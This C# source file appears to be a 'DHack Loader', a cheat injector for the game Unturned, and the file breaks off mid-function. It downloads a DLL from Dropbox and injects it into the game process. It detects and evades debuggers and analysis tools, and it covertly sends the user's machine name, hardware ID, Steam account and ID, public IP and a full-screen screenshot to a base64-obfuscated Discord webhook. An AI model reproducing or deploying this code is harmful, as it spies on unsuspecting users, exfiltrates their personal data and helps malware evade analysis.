using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;
using Newtonsoft.Json;
using SharpMonoInjector;

namespace Unturend_Injector
{
    internal class Program
    {
        private const string ObfuscatedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1NzAzMDQxNzQ2NjkyMTA0MC9hRllxSDZnek9WRUl0YkFBTDNUSm0wTXRHZTgzZEFPSERrU1FzR21NMk5XR2pyeUV2YWpnVjVnMy15bmkzTVE3V0NIQw==";

        private const string AlertVideoUrl = "https://www.dropbox.com/scl/fi/e4nvtwn96bd25kx8p4qcw/CRACKALNIKNA0.mp4?rlkey=mlf4dh9xtogxodb7kxnhnrkk2&st=9r7or8su&dl=1";

        private const string AlertVideoFileName = "CRACKALNIKNA0.mp4";

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtQueryInformationThread(nint threadHandle, int threadInformationClass, ref THREAD_BASIC_INFORMATION threadInformation, int threadInformationLength, out int returnLength);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(nint hObject);

        [DllImport("user32.dll")]
        private static extern nint GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern nint GetWindowDC(nint hWnd);

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(nint hdcDest, int xDest, int yDest, int wDest, int hDest, nint hdcSrc, int xSrc, int ySrc, int rasterOp);

        [DllImport("kernel32.dll")]
        private static extern nint OpenThread(int dwDesiredAccess, bool bInheritHandle, int dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(nint hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        private static extern nint GetCurrentThread();

        private enum AlertType
        {
            SecurityViolation,
            SuspendDetected
        }

        private struct THREAD_BASIC_INFORMATION
        {
            public int ExitStatus;
            public nint TebBaseAddress;
            public int ClientId;
            public int AffinityMask;
            public int Priority;
            public int BasePriority;
            public int SuspendCount;
        }

        private const int SRCCOPY = 0x00CC0020;
        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;
        private const int THREAD_QUERY_INFORMATION = 0x0040;
        private static volatile bool _isSuspended;
        private static readonly string[] BadProcesses = { "SystemInformer", "ProcessHacker", "HTTPDebugger", "Fiddler", "Wireshark", "Procmon", "Netmon", "Regmon", "Sandboxie", "x64dbg", "x32dbg", "dnSpy", "CheatEngine", "HxD", "ImmunityDebugger", "OllyDbg", "MegaDumper" };
        private static ManagementEventWatcher _processWatcher;
        private static Thread _monitoringThread;
        private const string TargetDll = "DHackLoader.dll";

        private static async Task Main(string[] args)
        {
            BypassChecks();
            Console.OutputEncoding = Encoding.UTF8;
            if (!IsRunningAsAdmin())
            {
                ShowErrorAndExit("English", LanguageKeys.AdminRequired);
                return;
            }

            string selectedLanguage = SelectLanguage();
            ShowLoaderInfo(selectedLanguage);
            bool debugMode = CheckDebugMode(selectedLanguage);
            string hwid = GetHWID();

            StartSuspendMonitor(selectedLanguage, debugMode);
            StartProcessMonitor(selectedLanguage);

            if (CheckSecurityEnvironment(debugMode, selectedLanguage))
            {
                ShowErrorAndExit(selectedLanguage, LanguageKeys.SecurityAlert,
                    GetLanguageValue(selectedLanguage, LanguageKeys.SecurityViolationDetail));
                return;
            }

            await SecurityReport(hwid, debugMode);
            await RunInjectorAsync(debugMode, selectedLanguage, hwid);
        }

        private static void StartProcessMonitor(string language)
        {
            _monitoringThread = new Thread(() =>
            {
                try
                {
                    WqlEventQuery startQuery = new("__InstanceCreationEvent", new TimeSpan(0, 0, 1), "TargetInstance isa 'Win32_Process'");
                    _processWatcher = new ManagementEventWatcher(startQuery);
                    _processWatcher.EventArrived += (sender, e) =>
                    {
                        try
                        {
                            ManagementBaseObject targetInstance = (ManagementBaseObject)e.NewEvent["TargetInstance"];
                            string processName = targetInstance["Name"].ToString();
                            int processId = Convert.ToInt32(targetInstance["ProcessId"]);
                            if (BadProcesses.Any(p => processName.Contains(p, StringComparison.OrdinalIgnoreCase)))
                            {
                                HandleSecurityViolation(language, processName, processId);
                            }
                        }
                        catch { }
                    };
                    _processWatcher.Start();
                    while (true) Thread.Sleep(1000);
                }
                catch (Exception ex) { Logger.Log($"{GetLanguageValue(language, LanguageKeys.ProcessMonitorFailed)}: {ex.Message}", ConsoleColor.Red); }
            })
            { IsBackground = true };
            _monitoringThread.Start();
        }

        private static void PlayAlertVideo(string language)
        {
            try
            {
                string tempPath = Path.GetTempPath();
                string videoPath = Path.Combine(tempPath, AlertVideoFileName);

                using (var client = new WebClient())
                {
                    client.DownloadFile(AlertVideoUrl, videoPath);
                }

                if (File.Exists(videoPath))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = videoPath,
                        UseShellExecute = true,
                        WindowStyle = ProcessWindowStyle.Maximized
                    });

                    Thread.Sleep(9000); // Play for 9 seconds
                    SecureDelete(videoPath, 3);
                }
            }
            catch
            {
            }
        }

        private static void DisplayAlert(string language, AlertType type, string processName = null, int? pid = null)
        {

            switch (type)
            {
                case AlertType.SecurityViolation:
                    PlayAlertVideo(language);
                    ShowColoredMessage(
                        $"\n{GetLanguageValue(language, LanguageKeys.SecurityViolationDetected)}",
                        $"{processName} (PID: {pid})"
                    );

                    _ = SendToDiscordWebhook(
                        $"🛑 {GetLanguageValue(language, LanguageKeys.SecurityViolationDetected)}\n" +
                        $"{GetLanguageValue(language, LanguageKeys.Process)}: {processName}\n" +
                        $"PID: {pid}\n" +
                        $"{GetLanguageValue(language, LanguageKeys.User)}: {Environment.UserName}\n" +
                        $"{GetLanguageValue(language, LanguageKeys.Machine)}: {Environment.MachineName}",
                        "error",
                        false
                    );
                    Environment.Exit(1);
                    break;

                case AlertType.SuspendDetected:
                    ShowColoredMessage(
                        $"\n=== {GetLanguageValue(language, LanguageKeys.SuspendDetected)} ===",
                        GetLanguageValue(language, LanguageKeys.SystemInformerDetected)
                    );
                    _isSuspended = true;
                    break;
            }

            // Общий метод для вывода цветных сообщений
            void ShowColoredMessage(params string[] messages)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                foreach (var msg in messages) Console.WriteLine(msg);
                Console.ResetColor();
            }

            // Общий метод для звукового оповещения (раскомментировать при необходимости)
            //Console.Beep(3000, 1000);




        }

        private static void HandleSecurityViolation(string language, string processName, int pid)
        {
            DisplayAlert(language, AlertType.SecurityViolation, processName, pid);
        }

        private static void StartSuspendMonitor(string language, bool debugMode)
        {
            new Thread(() =>
            {
                while (!_isSuspended)
                {
                    if (CheckSuspendedState(debugMode))
                    {
                        DisplayAlert(language, AlertType.SuspendDetected);
                    }
                    Thread.Sleep(250);
                }
            })
            { IsBackground = true }.Start();
        }

        private static bool CheckSecurityEnvironment(bool debugMode, string language)
        {
            bool securityIssue = CheckExistingProcesses(language, debugMode);
            if (!debugMode) securityIssue |= CheckDebugger() || CheckAnalysisTools() || CheckHardwareBreakpoints(debugMode) || CheckSuspendedState(debugMode);
            else securityIssue |= CheckSuspendedState(debugMode);
            return securityIssue;
        }

        private static bool CheckExistingProcesses(string language, bool debugMode)
        {
            IEnumerable<string> filteredProcesses = debugMode ? BadProcesses.Where(p => !p.Equals("HTTPDebugger") && !p.Equals("Fiddler")) : BadProcesses;
            List<Process> processes = Process.GetProcesses().Where(p => filteredProcesses.Any(bad => string.Equals(p.ProcessName, bad, StringComparison.OrdinalIgnoreCase))).ToList();
            return processes.Any();
        }

        private static bool CheckDebugger() => Debugger.IsAttached || Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING") == "1";
        private static bool CheckAnalysisTools() => Process.GetProcesses().Any(p => new[] { "joebox", "cuckoo", "anubis", "wireshark", "fiddler", "netmon", "Sysmon" }.Contains(p.ProcessName, StringComparer.OrdinalIgnoreCase));

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags;
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
        }

        private static bool CheckHardwareBreakpoints(bool debugMode)
        {
            if (debugMode) return false;
            try
            {
                CONTEXT context = new() { ContextFlags = 0x10 };
                return GetThreadContext(GetCurrentThread(), ref context) && (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0);
            }
            catch { return false; }
        }

        private static async Task RunInjectorAsync(bool debugMode, string selectedLanguage, string hwid)
        {
            string dllPath = Path.Combine(Path.GetTempPath(), TargetDll);
            try
            {
                CleanupOldFiles(new[] { dllPath }, debugMode);
                Process targetProcess = await FindOrStartUnturnedProcess(selectedLanguage, debugMode);
                if (targetProcess == null || !ValidateProcess(targetProcess, selectedLanguage, debugMode))
                {
                    await SendErrorToDiscord("Process Validation Failed", GetLanguageValue(selectedLanguage, LanguageKeys.ProcessValidationFailed), debugMode);
                    Pause(selectedLanguage);
                    return;
                }

                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"\n{string.Format(GetLanguageValue(selectedLanguage, LanguageKeys.DownloadStart), TargetDll)}");
                Console.ResetColor();

                if (!await DownloadFileWithProgress("https://www.dropbox.com/scl/fi/0qh67q1y0hje883sap5ub/DHackLoader.dll?rlkey=5jqnufl1e9dcxrp01vyzltycm&st=hvziuz0v&dl=1", dllPath, selectedLanguage, debugMode, TargetDll))
                {
                    await SendErrorToDiscord("DLL Download Failed", GetLanguageValue(selectedLanguage, LanguageKeys.DownloadFailed), debugMode);
                    Pause(selectedLanguage);
                    return;
                }

                var (Success, ErrorMessage) = InjectDll(targetProcess.Id, dllPath, selectedLanguage, debugMode);
                if (!Success)
                {
                    await SendErrorToDiscord("Injection Failed", $"{GetLanguageValue(selectedLanguage, LanguageKeys.InjectionFailed)}: {ErrorMessage}", debugMode);
                    Pause(selectedLanguage);
                    return;
                }

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"\n{string.Format(GetLanguageValue(selectedLanguage, LanguageKeys.InjectionSuccess), TargetDll)}");
                Console.ResetColor();

                byte[] screenshot = CaptureScreenshot();
                await SendInjectionReport(targetProcess, screenshot, debugMode);
                CleanupOldFiles(new[] { dllPath }, debugMode);
                await MonitorProcessAsync(targetProcess, selectedLanguage, debugMode);
            }
            catch (Exception ex)
            {
                await SendErrorToDiscord("Critical Error", ex.Message, debugMode);
                Logger.Log($"{GetLanguageValue(selectedLanguage, LanguageKeys.CriticalError)}: {ex}", ConsoleColor.Red);
            }
            finally
            {
                SecureDelete(dllPath, 3);
                CleanMonitoringResources();
            }
            Logger.Log(GetLanguageValue(selectedLanguage, LanguageKeys.InjectorFinished), ConsoleColor.Blue);
            Pause(selectedLanguage);
        }

        private static async Task<Process> StartNewProcess(string language, bool debugMode)
        {
            List<string> possiblePaths = GetPossibleExecutablePaths();
            string validPath = possiblePaths.FirstOrDefault(File.Exists);
            if (validPath == null)
            {
                Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ExeNotFoundMultiple), string.Join("\n", possiblePaths)), ConsoleColor.Red);
                return null;
            }

            try
            {
                Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ProcessNotFound), "Unturned"), ConsoleColor.Yellow);
                Process process = Process.Start(new ProcessStartInfo { FileName = validPath, UseShellExecute = true, WindowStyle = ProcessWindowStyle.Normal });
                if (process == null)
                {
                    Logger.Log(GetLanguageValue(language, LanguageKeys.ProcessStartFailed), ConsoleColor.Red);
                    return null;
                }

                Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ProcessStarted), process.Id), ConsoleColor.Green);
                for (int i = 0; i < 10; i++)
                {
                    Process p = GetTargetProcess("Unturned");
                    if (p != null) return p;
                    await Task.Delay(1000);
                    if (debugMode) Console.Write($"\r{GetLanguageValue(language, LanguageKeys.ProcessInitWait)} {i + 1}/10");
                }
                Logger.Log(GetLanguageValue(language, LanguageKeys.ProcessInitFailed), ConsoleColor.Red);
                return null;
            }
            catch (Exception ex)
            {
                Logger.Log($"{GetLanguageValue(language, LanguageKeys.ProcessStartFailed)}: {ex.Message}", ConsoleColor.Red);
                return null;
            }
        }

        private static async Task<Process> FindOrStartUnturnedProcess(string language, bool debugMode)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"\n{string.Format(GetLanguageValue(language, LanguageKeys.LookingForProcess), "Unturned")}");
            Console.ResetColor();

            Process targetProcess = GetTargetProcess("Unturned");
            if (targetProcess != null)
            {
                Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ProcessFound), targetProcess.ProcessName, targetProcess.Id), ConsoleColor.Green);
                return targetProcess;
            }
            return await StartNewProcess(language, debugMode);
        }

        private static async Task SendInjectionReport(Process process, byte[] screenshot, bool debugMode)
        {
            string message = $"✅ {GetLanguageValue("English", LanguageKeys.InjectionSuccess)}\nPID: {process.Id}\n{GetLanguageValue("English", LanguageKeys.Runtime)}: {DateTime.Now:HH:mm:ss}";
            if (screenshot == null) message += $"\n⚠️ {GetLanguageValue("English", LanguageKeys.ScreenshotFailed)}";
            await SendToDiscordWebhook(message, "success", debugMode, screenshot);
        }

        private static void SecureDelete(string path, int passes)
        {
            try
            {
                if (!File.Exists(path)) return;
                File.SetAttributes(path, FileAttributes.Normal);
                long length = new FileInfo(path).Length;
                using (FileStream fs = new(path, FileMode.Open))
                {
                    for (int i = 0; i < passes; i++)
                    {
                        byte[] randomData = new byte[length];
                        using RandomNumberGenerator rng = RandomNumberGenerator.Create();
                        rng.GetBytes(randomData);
                        fs.Write(randomData, 0, randomData.Length);
                        fs.Flush();
                    }
                }
                File.Delete(path);
                if (File.Exists(path)) File.Delete(path);
            }
            catch { }
        }

        private static void CleanMonitoringResources()
        {
            try { _processWatcher?.Stop(); _processWatcher?.Dispose(); _ = (_monitoringThread?.Join(1000)); } catch { }
        }

        private static (bool Success, string ErrorMessage) InjectDll(int processId, string dllPath, string language, bool debugMode)
        {
            try
            {
                using Injector injector = new(processId);
                _ = injector.Inject(File.ReadAllBytes(dllPath), "DHackLoader", "EntryPoint", "Entry");
                return (true, null);
            }
            catch (InjectorException ex) { return (false, $"{GetLanguageValue(language, LanguageKeys.InjectionException)}: {ex.Message}"); }
            catch (Exception ex) { return (false, $"{GetLanguageValue(language, LanguageKeys.GeneralError)}: {ex.Message}"); }
        }

        private static string GetLanguageValue(string language, string key)
        {
            try { return Languages[language][key]; }
            catch { return $"[[LANG ERROR: {key}]]"; }
        }

        private static void BypassChecks()
        {
            try
            {
                FieldInfo flags = typeof(Assembly).GetField("m_flags", BindingFlags.NonPublic | BindingFlags.Instance);
                if (flags != null)
                    foreach (Assembly asm in AppDomain.CurrentDomain.GetAssemblies())
                        flags.SetValue(asm, (int)flags.GetValue(asm) | 0x80);
            }
            catch { }
        }



        private static bool CheckSuspendedState(bool debugMode)
        {
            try
            {
                foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
                {
                    nint threadHandle = OpenThread(THREAD_QUERY_INFORMATION, false, thread.Id);
                    if (threadHandle == nint.Zero) continue;

                    THREAD_BASIC_INFORMATION tbi = new();
                    int status = NtQueryInformationThread(threadHandle, 0, ref tbi, Marshal.SizeOf(tbi), out _);
                    _ = CloseHandle(threadHandle);
                    if (status == 0 && tbi.SuspendCount > 0) return true;
                }
                return CheckHardwareBreakpoints(debugMode);
            }
            catch { return false; }
        }

        private static string SelectLanguage()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write(GetLanguageValue("English", LanguageKeys.LanguagePrompt));
            string selectedLang = Console.ReadLine() switch { "2" => "Russian", _ => "English" };

            if (!Languages.ContainsKey(selectedLang))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(GetLanguageValue("English", LanguageKeys.InvalidLanguage));
                selectedLang = "English";
            }

            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"\n{GetLanguageValue(selectedLang, LanguageKeys.LanguageSelected)}\n");
            Console.ResetColor();
            return selectedLang;
        }

        private static bool CheckDebugMode(string language)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write(GetLanguageValue(language, LanguageKeys.DebugPrompt));
            string input = ReadPassword();
            bool debugMode = input == "Kepka123";

            Console.ForegroundColor = debugMode ? ConsoleColor.Green : ConsoleColor.Yellow;
            Console.WriteLine(GetLanguageValue(language, debugMode ? LanguageKeys.DebugEnabled : LanguageKeys.DebugDisabled));
            Console.ResetColor();

            if (!string.IsNullOrEmpty(input) && input != "Kepka123")
            {
                _ = SendToDiscordWebhook(
                    $"{GetLanguageValue(language, LanguageKeys.FailedDebugAttempt)}\n" +
                    $"Input:{input}\n" +
                    $"{GetLanguageValue(language, LanguageKeys.User)}: {Environment.UserName}\n" +
                    $"{GetLanguageValue(language, LanguageKeys.Machine)}: {Environment.MachineName}",
                    "warning",
                    false
                );
            }
            return debugMode;
        }

        private static string ReadPassword()
        {
            string input = "";
            ConsoleKeyInfo key;
            do
            {
                key = Console.ReadKey(true);
                if (key.Key != ConsoleKey.Enter) input += key.KeyChar;
            } while (key.Key != ConsoleKey.Enter);
            Console.WriteLine();
            return input;
        }

        private static void ShowErrorAndExit(string language, string key, string formatArg = null)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            string message = formatArg == null ? GetLanguageValue(language, key) : string.Format(GetLanguageValue(language, key), formatArg);
            Console.WriteLine(message);
            Console.ResetColor();
            Thread.Sleep(2000);
            Environment.Exit(1);
        }

        private static bool IsRunningAsAdmin()
        {
            using WindowsIdentity identity = WindowsIdentity.GetCurrent();
            return new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void ShowLoaderInfo(string language)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(GetLanguageValue(language, LanguageKeys.AsciiArt));
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"\nDHack Loader v{GetAssemblyVersion()}");
            Console.WriteLine(GetLanguageValue(language, LanguageKeys.InitializingLoader));
            Console.ResetColor();
            QuickLoadingAnimation(3);
        }

        private static void QuickLoadingAnimation(int seconds)
        {
            DateTime endTime = DateTime.Now.AddSeconds(seconds);
            int counter = 0;
            string[] spinner = { "|", "/", "-", "\\" };
            while (DateTime.Now < endTime)
            {
                Console.Write($"\r{GetLanguageValue("English", LanguageKeys.Initializing)} {spinner[counter++ % spinner.Length]}");
                Thread.Sleep(100);
            }
            Console.WriteLine("\n");
        }

        private static async Task SecurityReport(string hwid, bool debugMode)
        {
            (string Username, string Steam64Id) = GetSteamUser();
            await SendToDiscordWebhook($"🔍 {GetLanguageValue("English", LanguageKeys.NewUserDetected)}\n{GetLanguageValue("English", LanguageKeys.User)}: {Environment.UserName}\n{GetLanguageValue("English", LanguageKeys.Machine)}: {Environment.MachineName}\nOS: {Environment.OSVersion.VersionString}\nHWID: {hwid}\nSteam User: {Username}\nSteam64 ID: {Steam64Id}\nIP: {await GetPublicIpAsync()}", "warning", debugMode);
        }

        private static async Task SendToDiscordWebhook(string message, string status, bool debugMode, byte[] screenshot = null)
        {
            try
            {
                using HttpClient client = new();
                var embed = new { title = status switch { "success" => "✅ Successful Injection", "warning" => "⚠️ Security Alert", "error" => "❌ Injection Error", _ => "ℹ️ Injection Info" }, description = message, color = status switch { "success" => 65280, "warning" => 16753920, "error" => 16711680, _ => 255 }, timestamp = DateTime.UtcNow.ToString("o"), footer = new { text = $"Dhack Loader v{GetAssemblyVersion()}" }, author = new { name = Environment.MachineName } };
                var payload = new { username = "Dhack Security Monitor", content = "**Notification from Injector**", embeds = new[] { embed } };
                using MultipartFormDataContent content = new() { { new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json"), "payload_json" } };
                if (screenshot != null)
                {
                    byte[] compressedScreenshot = CompressScreenshot(screenshot);
                    using ByteArrayContent contentPart = new(compressedScreenshot);
                    content.Add(contentPart, "file", "screenshot.jpg");
                }
                HttpResponseMessage response = await client.PostAsync(GetDiscordWebhookUrl(), content);
                if (debugMode && !response.IsSuccessStatusCode)
                    Console.WriteLine($"[ERROR] Discord send failed: {response.StatusCode}");
            }
            catch { }
        }

        private static byte[] CaptureScreenshot()
        {
            try
            {
                int screenWidth = GetSystemMetrics(SM_CXSCREEN);
                int screenHeight = GetSystemMetrics(SM_CYSCREEN);
                using Bitmap bitmap = new(screenWidth, screenHeight);
                using Graphics g = Graphics.FromImage(bitmap);
                nint hdcSrc = GetWindowDC(GetDesktopWindow());
                nint hdcDest = g.GetHdc();
                _ = BitBlt(hdcDest, 0, 0, screenWidth, screenHeight, hdcSrc, 0, 0, SRCCOPY);
                g.ReleaseHdc(hdcDest);
                using MemoryStream ms = new();
                bitmap.Save(ms, ImageFormat.Png);
                return ms.ToArray();
            }
            catch { return null; }
        }

        private static byte[] CompressScreenshot(byte[] screenshot)
        {
            try
            {
                using MemoryStream inputStream = new(screenshot);
                using MemoryStream outputStream = new();
                using Image image = Image.FromStream(inputStream);
                EncoderParameters encoderParams = new(1) { Param = { [0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 75L) } };
                ImageCodecInfo jpegCodec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(codec => codec.FormatID == ImageFormat.Jpeg.Guid);
                if (jpegCodec != null) image.Save(outputStream, jpegCodec, encoderParams);
                return outputStream.ToArray();
            }
            catch { return screenshot; }
        }

        private static string GetDiscordWebhookUrl()
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(ObfuscatedWebhook));
        }

        private static string GetAssemblyVersion()
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            Version version = assembly.GetName().Version;
            AssemblyConfigurationAttribute config = assembly.GetCustomAttribute<AssemblyConfigurationAttribute>();
            return $"{version} ({config?.Configuration ?? "Unknown"})";
        }

        private static string GetHWID()
        {
            try
            {
                using RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography");
                return key?.GetValue("MachineGuid")?.ToString() ?? "Unknown";
            }
            catch { return "Unknown"; }
        }

        private static (string Username, string Steam64Id) GetSteamUser()
        {
            try
            {
                string steamConfigPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam", "config", "loginusers.vdf");
                if (File.Exists(steamConfigPath))
                {
                    string[] lines = File.ReadAllLines(steamConfigPath);
                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (lines[i].Trim().Equals("\"users\"", StringComparison.OrdinalIgnoreCase))
                        {
                            i++;
                            if (i < lines.Length && lines[i].Trim() == "{")
                            {
                                i++;
                                while (i < lines.Length)
                                {
                                    if (lines[i].Trim().StartsWith("\"", StringComparison.Ordinal) && lines[i].Trim().EndsWith("\"", StringComparison.Ordinal))
                                    {
                                        string steamId = lines[i].Trim('"');
                                        i++;
                                        if (i < lines.Length && lines[i].Trim() == "{")
                                        {
                                            i++;
                                            string accountName = "Unknown";
                                            bool mostRecent = false;
                                            while (i < lines.Length)
                                            {
                                                if (lines[i].Trim().StartsWith("\"AccountName\"", StringComparison.OrdinalIgnoreCase))
                                                {
                                                    string[] parts = lines[i].Split(new[] { '\"' }, StringSplitOptions.RemoveEmptyEntries);
                                                    if (parts.Length >= 3) accountName = parts[2];
                                                }
                                                if (lines[i].Trim().StartsWith("\"MostRecent\"", StringComparison.OrdinalIgnoreCase))
                                                {
                                                    string[] parts = lines[i].Split(new[] { '\"' }, StringSplitOptions.RemoveEmptyEntries);
                                                    if (parts.Length >= 3 && parts[2] == "1") mostRecent = true;
                                                }
                                                if (lines[i].Trim() == "}") break;
                                                i++;
                                            }
                                            if (mostRecent) return (accountName, steamId);
                                        }
                                    }
                                    i++;
                                }
                            }
                        }
                    }
                }
            }
            catch { }
            return ("Unknown", "Unknown");
        }

        private static async Task<string> GetPublicIpAsync()
        {
            try
            {
                using HttpClient client = new();
                return await client.GetStringAsync("https://api.ipify.org");
            }
            catch { return "Unknown"; }
        }

        private static async Task<bool> DownloadFileWithProgress(string url, string savePath, string language, bool debugMode, string displayName)
        {
            try
            {
                using HttpClient client = new();
                HttpResponseMessage response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
                _ = response.EnsureSuccessStatusCode();
                _ = Directory.CreateDirectory(Path.GetDirectoryName(savePath));
                using Stream stream = await response.Content.ReadAsStreamAsync();
                using FileStream fileStream = new(savePath, FileMode.Create);
                long totalBytes = response.Content.Headers.ContentLength ?? -1L;
                byte[] buffer = new byte[8192];
                long bytesRead = 0L;
                int lastPercentage = -1;
                Console.CursorVisible = false;
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine(string.Format(GetLanguageValue(language, LanguageKeys.DownloadStart), displayName));
                Console.ResetColor();
                while (true)
                {
                    int read = await stream.ReadAsync(buffer);
                    if (read == 0) break;
                    await fileStream.WriteAsync(buffer.AsMemory(0, read));
                    bytesRead += read;
                    int currentPercentage = (int)((double)bytesRead / (totalBytes != -1 ? totalBytes : bytesRead) * 100);
                    if (currentPercentage != lastPercentage)
                    {
                        lastPercentage = currentPercentage;
                        UpdateProgressBar(currentPercentage);
                    }
                }
                Console.CursorVisible = true;
                Console.WriteLine("\n");
                if (!File.Exists(savePath)) return false;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(string.Format(GetLanguageValue(language, LanguageKeys.DownloadComplete), displayName));
                Console.ResetColor();
                return true;
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(string.Format(GetLanguageValue(language, LanguageKeys.DownloadFailed), ex.Message));
                Console.ResetColor();
                return false;
            }
        }

        private static void UpdateProgressBar(int percentage)
        {
            Console.CursorLeft = 0;
            Console.Write("[");
            Console.CursorLeft = 32;
            Console.Write("]");
            Console.CursorLeft = 1;
            float oneChunk = 30.0f / 100;
            int position = 1;
            for (int i = 0; i < oneChunk * percentage; i++)
            {
                Console.BackgroundColor = ConsoleColor.DarkCyan;
                Console.CursorLeft = position++;
                Console.Write(" ");
            }
            for (int i = position; i <= 31; i++)
            {
                Console.BackgroundColor = ConsoleColor.Black;
                Console.CursorLeft = position++;
                Console.Write(" ");
            }
            Console.CursorLeft = 35;
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Write($"{percentage}%");
        }

        private static Process GetTargetProcess(string processName)
        {
            Process[] processes = Process.GetProcessesByName(processName);
            return processes.Length > 0 ? processes[0] : null;
        }

        private static void CleanupOldFiles(string[] paths, bool debugMode)
        {
            foreach (string path in paths)
                try { if (File.Exists(path)) { if (debugMode) Logger.Log($"Cleaning: {path}", ConsoleColor.DarkGray); File.Delete(path); } } catch { }
        }

        private static async Task SendErrorToDiscord(string errorType, string errorMessage, bool debugMode)
        {
            try
            {
                using HttpClient client = new();
                var embed = new { title = $"❌ {errorType}", description = errorMessage, color = 16711680, timestamp = DateTime.UtcNow.ToString("o"), footer = new { text = $"Dhack Loader v{GetAssemblyVersion()}" }, author = new { name = Environment.MachineName } };
                var payload = new { username = "Dhack Error Reporter", embeds = new[] { embed } };
                using MultipartFormDataContent content = new() { { new StringContent(JsonConvert.SerializeObject(payload)), "payload_json" } };
                HttpResponseMessage response = await client.PostAsync(GetDiscordWebhookUrl(), content);
            }
            catch { }
        }

        private static async Task MonitorProcessAsync(Process process, string language, bool debugMode)
        {
            try
            {
                Stopwatch timer = Stopwatch.StartNew();
                while (!process.HasExited) await Task.Delay(1000);
                if (debugMode) Logger.Log($"{GetLanguageValue(language, LanguageKeys.ProcessLifetime)}: {timer.Elapsed.TotalSeconds:F1}s", ConsoleColor.DarkGray);
                if (timer.Elapsed.TotalSeconds < 25)
                {
                    Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ProcessClosedEarly), process.ProcessName), ConsoleColor.Red);
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine(GetLanguageValue(language, LanguageKeys.RestartPrompt));
                    string input = Console.ReadLine()?.Trim().ToLower();
                    if (input is "y" or "yes" or "д" or "да") RestartApplication(language);
                    Console.WriteLine(GetLanguageValue(language, LanguageKeys.ReinjectPrompt));
                    input = Console.ReadLine()?.Trim().ToLower();
                    if (input is "y" or "yes" or "д" or "да") await RunInjectorAsync(debugMode, language, "");
                }
            }
            catch { }
        }

        private static void RestartApplication(string language)
        {
            List<string> possiblePaths = GetPossibleExecutablePaths();
            string validPath = possiblePaths.FirstOrDefault(File.Exists);
            if (validPath == null) Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ExeNotFoundMultiple), string.Join("\n", possiblePaths)), ConsoleColor.Red);
            else
            {
                try
                {
                    Logger.Log(GetLanguageValue(language, LanguageKeys.Restarting), ConsoleColor.Blue);
                    _ = Process.Start(new ProcessStartInfo { FileName = validPath, UseShellExecute = true });
                    Logger.Log(GetLanguageValue(language, LanguageKeys.Restarted), ConsoleColor.Green);
                }
                catch (Exception ex) { Logger.Log($"{GetLanguageValue(language, LanguageKeys.RestartFailed)}: {ex.Message}", ConsoleColor.Red); }
            }
        }

        private static bool ValidateProcess(Process process, string language, bool debugMode)
        {
            try { _ = Process.GetProcessById(process.Id); return true; }
            catch { Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ProcessClosedEarly), "Unturned"), ConsoleColor.Red); return false; }
        }

        private static void Pause(string language)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(GetLanguageValue(language, LanguageKeys.PressAnyKey));
            Console.ResetColor();
            _ = Console.ReadKey();
        }

        private static List<string> GetPossibleExecutablePaths()
        {
            List<string> paths = new();
            foreach (DriveInfo drive in DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed))
            {
